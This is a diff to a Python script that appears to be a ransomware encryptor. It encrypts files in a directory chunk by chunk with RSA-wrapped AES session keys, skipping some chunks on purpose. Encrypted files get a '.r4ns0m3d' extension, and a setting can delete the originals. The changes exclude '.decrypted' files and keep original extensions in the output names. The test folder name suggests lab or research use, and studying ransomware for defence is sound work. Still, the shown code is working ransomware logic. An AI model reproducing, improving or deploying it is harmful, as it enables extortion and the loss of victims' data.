@@ -1,6 +1,6 @@
-import base64
 import os
 from pathlib import Path
+import sys
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 
@@ -8,7 +8,7 @@ from Crypto.Cipher import PKCS1_OAEP, AES
 directory = './Ransomtest' # the directory to encrypt
 publickey_file = 'public.pem' # file name of public key
 fileExtension = '.r4ns0m3d' # use any extension, this will be the file extension of encrypted files
-excludeExtension = ['.py', '.pem', fileExtension] # file extensions to exclude from encryption
+excludeExtension = ['.py', '.pem', '.decrypted', fileExtension] # file extensions to exclude from encryption
 chunk_size = 4 # integer value of the size of chunks that files will be split into
 intermittent_size = 4 # integer value of how many unencrypted chunks per encrypted chunk
 clean_original_files = False # whether the program will delete original unencrypted files after encryption
@@ -45,7 +45,7 @@ def encrypt(dataFile, publicKey):
     
     # create a new outfile
     fileName = dataFile.split(extension)[0]
-    encryptedFile = fileName + fileExtension
+    encryptedFile = fileName + extension + fileExtension
 
     with open(dataFile, 'rb') as f:
         counter = 0
@@ -64,11 +64,12 @@ def encrypt(dataFile, publicKey):
                 # write the chunk to outfile
                 with open(encryptedFile, 'ab') as out:
                     [ out.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
+
             else:
                 # write the chunk to outfile without doing anything
                 with open(encryptedFile, 'ab') as out:
                     [ out.write(chunk) ]
-
+            
             counter += 1
 
     # delete original files when finished?
